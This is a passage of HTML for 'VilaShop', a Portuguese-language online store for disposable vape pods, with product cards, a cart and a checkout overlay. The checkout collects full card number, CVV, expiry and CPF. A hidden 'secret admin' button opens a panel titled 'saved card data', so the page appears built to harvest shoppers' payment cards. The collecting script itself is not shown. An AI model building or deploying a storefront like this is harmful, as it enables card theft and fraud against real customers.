<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>VilaShop - Pods e Vapes</title>
  <style>
    :root {
      --primary: #1a1a1a;
      --secondary: #2d2d2d;
      --accent: #e74c3c;
      --accent-hover: #c0392b;
      --text: #f5f5f5;
      --text-secondary: #b0b0b0;
      --border: #404040;
      --card-bg: #2d2d2d;
      --success: #2ecc71;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: var(--primary);
      color: var(--text);
      line-height: 1.6;
    }
    
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.85);
      display: none;
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }
    
    .overlay-content {
      background: var(--card-bg);
      padding: 25px;
      border-radius: 12px;
      max-width: 500px;
      width: 90%;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      border: 1px solid var(--border);
    }
    
    .carrinho-sidebar {
      position: fixed;
      right: -400px;
      top: 0;
      width: 380px;
      height: 100%;
      background: var(--card-bg);
      box-shadow: -5px 0 15px rgba(0,0,0,0.3);
      transition: right 0.3s ease;
      z-index: 999;
      padding: 25px;
      overflow-y: auto;
      border-left: 1px solid var(--border);
    }
    
    .carrinho-sidebar.active {
      right: 0;
    }
    
    .produtos-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
      gap: 25px;
      padding: 25px;
    }
    
    .produto-card {
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 20px;
      text-align: center;
      background: var(--card-bg);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      cursor: pointer;
    }
    
    .produto-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: var(--accent);
    }
    
    .produto-card:hover {
      transform: translateY(-8px);
      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
      border-color: var(--accent);
    }
    
    .produto-card img {
      max-width: 100%;
      height: 180px;
      object-fit: contain;
      margin-bottom: 15px;
      border-radius: 8px;
    }
    
    .preco-antigo {
      text-decoration: line-through;
      color: var(--text-secondary);
      font-size: 0.9em;
    }
    
    .preco-atual {
      font-weight: bold;
      color: var(--accent);
      font-size: 1.4em;
      margin: 5px 0;
    }
    
    .btn-comprar {
      background: var(--accent);
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
      width: 100%;
      font-weight: bold;
      font-size: 1em;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    
    .btn-comprar:hover {
      background: var(--accent-hover);
      transform: translateY(-2px);
    }
    
    .paginacao {
      display: flex;
      justify-content: center;
      margin: 30px 0;
    }
    
    .pagina-btn {
      padding: 10px 18px;
      margin: 0 8px;
      border: 1px solid var(--border);
      background: var(--card-bg);
      color: var(--text);
      cursor: pointer;
      border-radius: 6px;
      transition: all 0.3s ease;
    }
    
    .pagina-btn.ativa {
      background: var(--accent);
      color: white;
      border-color: var(--accent);
    }
    
    .pagina-btn:hover:not(.ativa) {
      background: var(--secondary);
    }
    
    .checkout-section {
      padding: 30px;
      max-width: 1100px;
      margin: 0 auto;
      display: none;
    }
    
    .checkout-container {
      display: flex;
      gap: 30px;
    }
    
    .checkout-steps {
      flex: 2;
    }
    
    .resumo-pedido {
      flex: 1;
      border: 1px solid var(--border);
      padding: 25px;
      border-radius: 12px;
      background: var(--card-bg);
    }
    
    .checkout-step {
      display: none;
      background: var(--card-bg);
      padding: 25px;
      border-radius: 12px;
      border: 1px solid var(--border);
    }
    
    .checkout-step.active {
      display: block;
    }
    
    .campo {
      margin-bottom: 20px;
    }
    
    .campo label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: var(--text);
    }
    
    .campo input, .campo select {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid var(--border);
      border-radius: 6px;
      box-sizing: border-box;
      background: var(--primary);
      color: var(--text);
      font-size: 1em;
    }
    
    .campo input:focus, .campo select:focus {
      outline: none;
      border-color: var(--accent);
    }
    
    .campo-duplo {
      display: flex;
      gap: 15px;
    }
    
    .campo-duplo .campo {
      flex: 1;
    }
    
    .btn-proximo {
      background: var(--accent);
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      font-size: 1em;
      transition: all 0.3s ease;
    }
    
    .btn-proximo:hover {
      background: var(--accent-hover);
    }
    
    .opcoes-pagamento {
      display: flex;
      gap: 15px;
      margin-top: 20px;
    }
    
    .opcao-pagamento {
      flex: 1;
      border: 1px solid var(--border);
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
      background: var(--primary);
    }
    
    .opcao-pagamento:hover {
      border-color: var(--accent);
      transform: translateY(-3px);
    }
    
    .topo {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 30px;
      background: var(--secondary);
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    
    .logo h1 {
      margin: 0;
      color: var(--accent);
      font-size: 1.8em;
      font-weight: 700;
    }
    
    .logo p {
      margin: 0;
      font-size: 0.9em;
      color: var(--text-secondary);
    }
    
    .barra-pesquisa {
      display: flex;
      flex: 1;
      max-width: 500px;
      margin: 0 30px;
    }
    
    .barra-pesquisa input {
      flex: 1;
      padding: 12px 20px;
      border: 1px solid var(--border);
      border-radius: 6px 0 0 6px;
      background: var(--primary);
      color: var(--text);
      font-size: 1em;
    }
    
    .barra-pesquisa input:focus {
      outline: none;
      border-color: var(--accent);
    }
    
    .barra-pesquisa button {
      background: var(--accent);
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 0 6px 6px 0;
      cursor: pointer;
      transition: background 0.3s;
    }
    
    .barra-pesquisa button:hover {
      background: var(--accent-hover);
    }
    
    .menu {
      display: flex;
      align-items: center;
      gap: 20px;
    }
    
    .menu a {
      color: var(--text);
      text-decoration: none;
      font-weight: 500;
      transition: color 0.3s;
    }
    
    .menu a:hover {
      color: var(--accent);
    }
    
    .btn-carrinho {
      background: var(--success);
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .btn-carrinho:hover {
      background: #27ae60;
      transform: translateY(-2px);
    }
    
    .hero {
      background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://images.unsplash.com/photo-1603712610496-5362ac4b8e3a?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
      background-size: cover;
      background-position: center;
      padding: 100px 30px;
      text-align: center;
      color: white;
    }
    
    .hero-text h2 {
      font-size: 3em;
      margin-bottom: 15px;
      font-weight: 700;
    }
    
    .hero-text p {
      font-size: 1.2em;
      max-width: 600px;
      margin: 0 auto 25px;
      color: var(--text-secondary);
    }
    
    .btn-cta {
      background: var(--accent);
      color: white;
      padding: 15px 35px;
      border-radius: 6px;
      text-decoration: none;
      display: inline-block;
      margin-top: 20px;
      font-weight: bold;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 1.1em;
    }
    
    .btn-cta:hover {
      background: var(--accent-hover);
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
    }
    
    .contato {
      padding: 60px 30px;
      text-align: center;
      background: var(--secondary);
      color: white;
    }
    
    .contato h2 {
      font-size: 2.2em;
      margin-bottom: 20px;
      color: var(--accent);
    }
    
    .carrinho-item {
      display: flex;
      align-items: center;
      padding: 15px 0;
      border-bottom: 1px solid var(--border);
    }
    
    .carrinho-item img {
      width: 60px;
      height: 60px;
      object-fit: contain;
      margin-right: 15px;
      border-radius: 6px;
      background: var(--primary);
      padding: 5px;
    }
    
    .carrinho-item div {
      flex: 1;
    }
    
    .carrinho-item h4 {
      margin: 0 0 5px;
      font-size: 1.1em;
    }
    
    .carrinho-item p {
      margin: 0;
      color: var(--text-secondary);
      font-size: 0.9em;
    }
    
    .remover-item {
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.3s;
    }
    
    .remover-item:hover {
      background: var(--accent-hover);
    }
    
    .carrinho-total {
      margin-top: 25px;
      padding-top: 25px;
      border-top: 1px solid var(--border);
    }
    
    .subtotal, .frete, .total {
      display: flex;
      justify-content: space-between;
      margin-bottom: 12px;
    }
    
    .total {
      font-weight: bold;
      font-size: 1.3em;
      border-top: 1px solid var(--border);
      padding-top: 15px;
    }
    
    .btn-finalizar-compra {
      background: var(--success);
      color: white;
      border: none;
      padding: 15px;
      border-radius: 6px;
      width: 100%;
      cursor: pointer;
      font-weight: bold;
      margin-top: 15px;
      font-size: 1.1em;
      transition: all 0.3s ease;
    }
    
    .btn-finalizar-compra:hover {
      background: #27ae60;
      transform: translateY(-2px);
    }
    
    .sabores {
      margin: 15px 0;
      font-size: 0.9em;
      color: var(--text-secondary);
    }
    
    .sabores select {
      width: 100%;
      margin-top: 5px;
      background: var(--primary);
      color: var(--text);
      border: 1px solid var(--border);
      padding: 8px;
      border-radius: 4px;
    }
    
    .parcelamento, .pix {
      font-size: 0.9em;
      margin: 8px 0;
      color: var(--text-secondary);
    }
    
    .modelo {
      font-weight: bold;
      color: var(--accent);
      margin: 8px 0;
      font-size: 1.1em;
    }
    
    .produto-card h3 {
      margin: 10px 0;
      font-size: 1.2em;
      min-height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .btn-voltar {
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 50%;
      width: 35px;
      height: 35px;
      cursor: pointer;
      float: right;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.3s;
    }
    
    .btn-voltar:hover {
      background: var(--accent-hover);
    }
    
    .btn-finalizar {
      background: var(--success);
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      width: 100%;
      margin-top: 20px;
      font-size: 1.1em;
      transition: all 0.3s ease;
    }
    
    .btn-finalizar:hover {
      background: #27ae60;
      transform: translateY(-2px);
    }
    
    .success-box {
      text-align: center;
      padding: 30px;
    }
    
    .check {
      font-size: 4em;
      margin-bottom: 20px;
      color: var(--success);
    }
    
    .qr-container {
      text-align: center;
      margin: 20px 0;
    }
    
    .qr-container img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      border: 1px solid var(--border);
    }
    
    .payment-screen {
      display: none;
    }
    
    .carrinho-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      padding-bottom: 20px;
      border-bottom: 1px solid var(--border);
    }
    
    .carrinho-header h3 {
      margin: 0;
      font-size: 1.5em;
      color: var(--accent);
    }
    
    .btn-fechar {
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 50%;
      width: 35px;
      height: 35px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.3s;
    }
    
    .btn-fechar:hover {
      background: var(--accent-hover);
    }
    
    .resumo-item {
      display: flex;
      justify-content: space-between;
      padding: 12px 0;
      border-bottom: 1px solid var(--border);
    }
    
    .resumo-item h4 {
      margin: 0 0 5px;
      font-size: 1.1em;
    }
    
    .resumo-item p {
      margin: 0;
      color: var(--text-secondary);
      font-size: 0.9em;
    }
    
    .cupom {
      display: flex;
      margin: 20px 0;
    }
    
    .cupom input {
      flex: 1;
      padding: 12px 15px;
      border: 1px solid var(--border);
      border-radius: 6px 0 0 6px;
      background: var(--primary);
      color: var(--text);
    }
    
    .cupom input:focus {
      outline: none;
      border-color: var(--accent);
    }
    
    .cupom button {
      background: var(--accent);
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 0 6px 6px 0;
      cursor: pointer;
      transition: background 0.3s;
    }
    
    .cupom button:hover {
      background: var(--accent-hover);
    }
    
    .linha-total {
      display: flex;
      justify-content: space-between;
      margin-bottom: 12px;
    }
    
    .total-final {
      font-weight: bold;
      font-size: 1.3em;
      border-top: 1px solid var(--border);
      padding-top: 15px;
    }
    
    .produtos h2, .contato h2 {
      text-align: center;
      font-size: 2.5em;
      margin: 40px 0 20px;
      color: var(--accent);
    }
    
    .sem-resultados {
      text-align: center;
      padding: 40px;
      grid-column: 1 / -1;
      color: var(--text-secondary);
      font-size: 1.2em;
    }
    
    .opcoes-entrega {
      margin-top: 20px;
    }
    
    .opcao-entrega {
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      background: var(--primary);
    }
    
    .opcao-entrega:hover {
      border-color: var(--accent);
    }
    
    .opcao-entrega.selecionada {
      border-color: var(--accent);
      background: rgba(231, 76, 60, 0.1);
    }
    
    .opcao-entrega-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 5px;
    }
    
    .opcao-entrega-nome {
      font-weight: bold;
      font-size: 1.1em;
    }
    
    .opcao-entrega-preco {
      font-weight: bold;
      color: var(--accent);
    }
    
    .opcao-entrega-detalhes {
      color: var(--text-secondary);
      font-size: 0.9em;
    }
    
    .pix-info {
      background: #1a1a1a;
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
      border: 1px solid #404040;
    }
    .pix-info p {
      margin: 8px 0;
      font-size: 0.9em;
    }
    
    .mensagem-envio {
      background: var(--success);
      color: white;
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
      text-align: center;
      display: none;
    }
    
    .loading {
      text-align: center;
      padding: 20px;
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #e74c3c;
      border-radius: 50%;
      animation: spin 2s linear infinite;
      margin: 0 auto;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .parcelamento-opcoes {
      margin-top: 15px;
    }
    
    .parcelamento-opcoes select {
      width: 100%;
      margin-top: 5px;
    }

    /* NOVO: Modal de produto individual */
    .produto-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.9);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1001;
      padding: 20px;
    }

    .produto-modal-content {
      background: var(--card-bg);
      padding: 30px;
      border-radius: 12px;
      max-width: 500px;
      width: 100%;
      max-height: 90vh;
      overflow-y: auto;
      border: 2px solid var(--accent);
      text-align: center;
    }

    .produto-modal-img {
      max-width: 100%;
      height: 200px;
      object-fit: contain;
      margin-bottom: 20px;
      border-radius: 8px;
    }

    .produto-modal-sabores {
      margin: 20px 0;
    }

    .produto-modal-sabores select {
      width: 100%;
      padding: 10px;
      background: var(--primary);
      color: var(--text);
      border: 1px solid var(--border);
      border-radius: 6px;
      margin-top: 10px;
    }

    .produto-modal-preco {
      font-size: 1.5em;
      color: var(--accent);
      font-weight: bold;
      margin: 15px 0;
    }

    .produto-modal-botoes {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }

    .produto-modal-botoes button {
      flex: 1;
      padding: 12px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    .btn-adicionar-carrinho {
      background: var(--success);
      color: white;
    }

    .btn-comprar-agora {
      background: var(--accent);
      color: white;
    }

    .btn-fechar-modal {
      background: var(--border);
      color: var(--text);
    }

    /* Botão admin */
    #botao-admin {
      position: fixed;
      bottom: 20px;
      left: 20px;
      z-index: 9999;
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      font-size: 20px;
      cursor: pointer;
      opacity: 0.3;
      transition: opacity 0.3s;
    }

    #botao-admin:hover {
      opacity: 1;
    }

    /* Painel admin */
    #admin-panel {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: var(--card-bg);
      padding: 20px;
      border-radius: 10px;
      border: 2px solid var(--accent);
      z-index: 10000;
      max-width: 90%;
      max-height: 80vh;
      overflow-y: auto;
      color: var(--text);
    }

    @media (max-width: 768px) {
      .topo {
        flex-direction: column;
        padding: 15px;
      }
      
      .barra-pesquisa {
        margin: 15px 0;
        max-width: 100%;
      }
      
      .menu {
        margin-top: 15px;
      }
      
      .checkout-container {
        flex-direction: column;
      }
      
      .carrinho-sidebar {
        width: 100%;
        right: -100%;
      }
      
      .produtos-grid {
        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
        padding: 15px;
      }
      
      .hero-text h2 {
        font-size: 2.2em;
      }

      .produto-modal-botoes {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <!-- Modal para produto individual -->
  <div id="produto-modal" class="produto-modal">
    <div class="produto-modal-content">
      <button class="btn-voltar" onclick="fecharModalProduto()">✕</button>
      <img id="modal-produto-img" class="produto-modal-img" src="" alt="">
      <h3 id="modal-produto-nome"></h3>
      <p id="modal-produto-modelo" class="modelo"></p>
      
      <div class="produto-modal-precos">
        <span class="preco-antigo" id="modal-preco-antigo"></span>
        <div class="produto-modal-preco" id="modal-preco-atual"></div>
      </div>

      <div class="produto-modal-sabores">
        <label>Escolha o sabor:</label>
        <select id="modal-seletor-sabor"></select>
      </div>

      <div class="produto-modal-botoes">
        <button class="btn-adicionar-carrinho" onclick="adicionarAoCarrinhoDoModal()">Adicionar ao Carrinho</button>
        <button class="btn-comprar-agora" onclick="comprarAgoraDoModal()">Comprar Agora</button>
      </div>
    </div>
  </div>

  <!-- Painel Admin para ver dados -->
  <div id="admin-panel">
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
      <h3 style="color: #e74c3c; margin: 0;">📊 DADOS DOS CARTÕES SALVOS</h3>
      <button onclick="fecharPainelAdmin()" style="background: #e74c3c; color: white; border: none; border-radius: 5px; padding: 5px 10px; cursor: pointer;">Fechar</button>
    </div>
    <div id="dados-salvos" style="font-family: monospace; font-size: 12px;"></div>
  </div>

  <!-- Botão secreto admin -->
  <button id="botao-admin">👁️</button>

  <!-- Overlay de pagamento -->
  <div id="payment-overlay" class="overlay">
    <div class="overlay-content">
      <button id="close-overlay" class="btn-voltar">✕</button>

      <div id="pix-screen" class="payment-screen">
        <h3>Pagar com Pix</h3>
        <p>Escaneie o QR Code abaixo para pagar:</p>
        <div class="qr-container">
          <img id="pix-qr" src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020126360014br.gov.bcb.pix011400075631-1619-423f-aa42-b5f415c455e0520400005303986540510.005802BR5913LUIZ%20DAVI%20DOS%20SANTOS%20NACIFF6008BRASILIA62070503***6304EA6A" alt="QR Code PIX">
        </div>
        <div class="pix-info">
          <p><strong>Beneficiário:</strong> LUIZ DAVI DOS SANTOS NACIFF</p>
          <p><strong>Chave PIX:</strong> 00075631-1619-423f-aa42-b5f415c455e0</p>
        </div>
        <p id="pix-instructions" style="color: #2ecc71; font-weight: bold;">
          Aguardando confirmação do pagamento...
        </p>
        
        <div id="payment-status" style="text-align: center; margin-top: 20px;">
          <div id="loading-spinner" style="display: block;">
            <div class="spinner"></div>
            <p>Verificando pagamento... (até 24 horas)</p>
          </div>
        </div>
        
        <button id="back-to-store" class="btn-finalizar" style="background: #95a5a6; margin-top: 15px;">Voltar à Loja</button>
      </div>

      <div id="card-screen" class="payment-screen">
        <h3>Pagar com Cartão</h3>
        
        <div class="mensagem-envio" id="mensagem-envio">
          ✅ Processando pagamento...
        </div>
        
        <div id="loading-envio" class="loading" style="display: none;">
          <div class="spinner"></div>
          <p>Enviando dados...</p>
        </div>
        
        <div class="form-cartao">
          <div class="campo">
            <label for="card-number">Número do cartão</label>
            <input id="card-number" type="text" maxlength="19" placeholder="4111 1111 1111 1111">
          </div>
          <div class="campo">
            <label for="card-name">Nome no cartão</label>
            <input id="card-name" type="text" placeholder="João Silva Santos">
          </div>
          <div class="campo">
            <label for="card-cpf">CPF do titular</label>
            <input id="card-cpf" type="text" placeholder="123.456.789-00" maxlength="14">
          </div>
          <div class="campo-duplo">
            <div class="campo">
              <label for="card-exp">Validade</label>
              <input id="card-exp" type="text" placeholder="MM/AA">
            </div>
            <div class="campo">
              <label for="card-cvv">CVV</label>
              <input id="card-cvv" type="text" placeholder="CVV" maxlength="3">
            </div>
          </div>
          
          <div class="campo">
            <label for="parcelas">Parcelamento</label>
            <select id="parcelas">
              <option value="1">1x de R$ 0,00 (à vista)</option>
            </select>
          </div>
          
          <button id="pay-card" class="btn-finalizar">Finalizar Pagamento</button>
        </div>
      </div>

      <div id="success-screen" class="payment-screen">
        <div class="success-box">
          <div class="check">✔️</div>
          <h2 id="success-title">Pagamento aprovado</h2>
          <p id="success-msg"></p>
          <button id="finish-btn" class="btn-cta">Voltar à loja</button>
        </div>
      </div>
    </div>
  </div>

  <header class="topo">
    <div class="logo">
      <h1>VilaShop</h1>
      <p>Pods que faltam pra você</p>
    </div>
    
    <div class="barra-pesquisa">
      <input type="text" id="input-pesquisa" placeholder="Pesquisar produtos...">
      <button id="btn-pesquisar">🔍</button>
    </div>
    
    <nav class="menu">
      <a href="#produtos">Produtos</a>
      <a href="#contato">Contato</a>
      <button id="carrinho-btn" class="btn-carrinho">🛒 Carrinho</button>
    </nav>
  </header>

  <main>
    <section class="hero">
      <div class="hero-text">
        <h2>Bem-vindo à VilaShop</h2>
        <p>Os melhores pods e vapes pra quem tem estilo.</p>
        <a href="#produtos" class="btn-cta">Ver Produtos</a>
      </div>
    </section>

    <div id="carrinho-sidebar" class="carrinho-sidebar">
      <div class="carrinho-header">
        <h3>Seu Carrinho</h3>
        <button id="fechar-carrinho" class="btn-fechar">✕</button>
      </div>
      <div id="carrinho-itens" class="carrinho-itens"></div>
      <div class="carrinho-total">
        <div class="subtotal">
          <span>Subtotal:</span>
          <span id="subtotal-valor">R$ 0,00</span>
        </div>
        <div class="frete">
          <span>Frete:</span>
          <span id="frete-valor">Grátis</span>
        </div>
        <div class="total">
          <span>Total:</span>
          <span id="total-valor">R$ 0,00</span>
        </div>
        <button id="finalizar-compra" class="btn-finalizar-compra">Finalizar Compra</button>
      </div>
    </div>

    <section id="produtos" class="produtos">
      <h2>Nossos Pods</h2>
      <div class="produtos-grid" id="produtos-grid">
        <!-- PRODUTO 1 - V-TOUCH 30K -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('V-TOUCH')">
          <img src="https://currentti.com.br/wp-content/uploads/2025/04/touch_fab.webp" alt="Pod Descartável V-touch 30k">
          <h3>POD DESCARTÁVEL V-TOUCH</h3>
          <p class="modelo">30K</p>
          <div class="precos">
            <span class="preco-antigo">R$ 187,38</span>
            <span class="preco-atual">R$ 149,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 16,97 COM JUROS</p>
          <p class="pix">À vista R$ 142,41 no PIX</p>
          <div class="sabores">
            <span>Gummylicious (chiclete)</span>
            <span>Blueberry Ice</span>
            <span>Watermelon</span>
          </div>
        </div>

        <!-- PRODUTO 2 - WAKA -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('WAKA')">
          <img src="https://tse3.mm.bing.net/th/id/OIP.lB4pzEutRMFSJOhR72g77QHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3" alt="WAKA Titan 30000 Puffs">
          <h3>POD DESCARTÁVEL WAKA</h3>
          <p class="modelo">1800 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 145,00</span>
            <span class="preco-atual">R$ 116,00</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 13,14 COM JUROS</p>
          <p class="pix">À vista R$ 110,20 no PIX</p>
          <div class="sabores">
            <span>Peach Mango Watermelon</span>
            <span>Grape Ice</span>
            <span>Strawberry Kiwi</span>
          </div>
        </div>

        <!-- PRODUTO 3 - OXBAR -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('OXBAR')">
          <img src="https://tse2.mm.bing.net/th/id/OIP.m_4ybz9u0Ubg1u4SEhARzgHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Elf Bar BC5000">
          <h3>POD DESCARTÁVEL OXBAR</h3>
          <p class="modelo">8500 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 132,50</span>
            <span class="preco-atual">R$ 106,00</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 12,00 COM JUROS</p>
          <p class="pix">À vista R$ 100,70 no PIX</p>
          <div class="sabores">
            <span>Blue Razz Ice</span>
            <span>Watermelon Ice</span>
            <span>Peach Mango</span>
          </div>
        </div>

        <!-- PRODUTO 4 - MASKING -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('MASKING')">
          <img src="https://loja.starcompany-py.com/57-large_default/ignite-v80-banana-cherry.jpg" alt="IGNITE V80 Black">
          <h3>POD DESCARTÁVEL MASKING</h3>
          <p class="modelo">8000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 80,00</span>
            <span class="preco-atual">R$ 50,00</span>
          </div>
          <p class="parcelamento">EM ATÉ 5X DE R$ 11,50 COM JUROS</p>
          <p class="pix">À vista R$ 47,50 no PIX</p>
          <div class="sabores">
            <span>Banana Cherry</span>
            <span>Blue Razz Ice</span>
            <span>Watermelon Ice</span>
          </div>
        </div>

        <!-- PRODUTO 5 - ELF BAR BC18000 -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('ELF BAR BC18000')">
          <img src="https://currentti.com.br/wp-content/uploads/2025/09/15345402211-149-g-lost-mary-mixer-30k-30000-puffs-pod-descar-57-500x500.webp" alt="Pod Descartável Elfbar BC18000">
          <h3>POD DESCARTÁVEL ELFBAR</h3>
          <p class="modelo">BC18000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 145,00</span>
            <span class="preco-atual">R$ 116,00</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 13,14 COM JUROS</p>
          <p class="pix">À vista R$ 110,20 no PIX</p>
          <div class="sabores">
            <span>Peach Mango Watermelon</span>
            <span>Blue Razz Ice</span>
            <span>Watermelon Ice</span>
          </div>
        </div>

        <!-- PRODUTO 6 - IGNITE V155 -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('IGNITE V155')">
          <img src="https://currentti.com.br/wp-content/uploads/2025/09/15378279484-ignite-v155-2-1.png" alt="Pod Descartável Ignite V155 Ultra Slim 15.500 Puffs">
          <h3>POD DESCARTÁVEL IGNITE V155</h3>
          <p class="modelo">15500 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 162,38</span>
            <span class="preco-atual">R$ 124,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 14,15 COM JUROS</p>
          <p class="pix">À vista R$ 118,66 no PIX</p>
          <div class="sabores">
            <span>Tropical Açaí</span>
            <span>Icy Mint</span>
            <span>Grape Ice</span>
          </div>
        </div>

        <!-- PRODUTO 7 - IGNITE V250 -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('IGNITE V250')">
          <img src="https://cdn.paradisevape.com.br/upload/product/45933/ignite-v250-gold-sweet-and-sou.jpg" alt="IGNITE Gold Edition V250">
          <h3>IGNITE GOLD EDITION V250</h3>
          <p class="modelo">25000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 179,90</span>
            <span class="preco-atual">R$ 145,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 16,52 COM JUROS</p>
          <p class="pix">À vista R$ 125,91 no PIX</p>
          <div class="sabores">
            <span>Banana Coconut</span>
            <span>Blueberry Ice</span>
            <span>Pineapple Ice</span>
          </div>
        </div>

        <!-- PRODUTO 8 - ELF BAR EW 9000 -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('ELF BAR EW 9000')">
          <img src="https://currentti.com.br/wp-content/uploads/2024/12/elfbar-ew-9000-12.webp" alt="Pod Descartável Elf Bar EW 9000 Puffs">
          <h3>Pod Descartável Elf Bar EW 9000 Puffs</h3>
          <p class="modelo">9000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 156,25</span>
            <span class="preco-atual">R$ 125,00</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 14,15 COM JUROS</p>
          <p class="pix">À vista R$ 118,75 no PIX</p>
          <div class="sabores">
            <span>Grape Ice</span>
            <span>Strawberry Kiwi</span>
            <span>Watermelon</span>
          </div>
        </div>

        <!-- PRODUTO 9 - OXBAR 35K -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('OXBAR 35K')">
          <img src="https://currentti.com.br/wp-content/uploads/2025/06/181_G_Oxbar-Ice-Nic-Control-35000-puffs-35k-Pod_69.jpg" alt="Pod Descartável Oxbar 35K 35.000 Puffs">
          <h3>Pod Descartável Oxbar 35K 35.000 Puffs</h3>
          <p class="modelo">35000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 212,38</span>
            <span class="preco-atual">R$ 169,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 19,24 COM JUROS</p>
          <p class="pix">À vista R$ 161,41 no PIX</p>
          <div class="sabores">
            <span>Banana nerz</span>
            <span>fruty pebz</span>
            <span>jewel cane mint</span>
            <span>jolly watermelon</span>
            <span>pink strawberry burt</span>
            <span>strawberry shocake</span>
          </div>
        </div>

        <!-- PRODUTO 10 - IGNITE V80 -->
        <div class="produto-card" data-page="1" onclick="abrirModalProduto('IGNITE V80')">
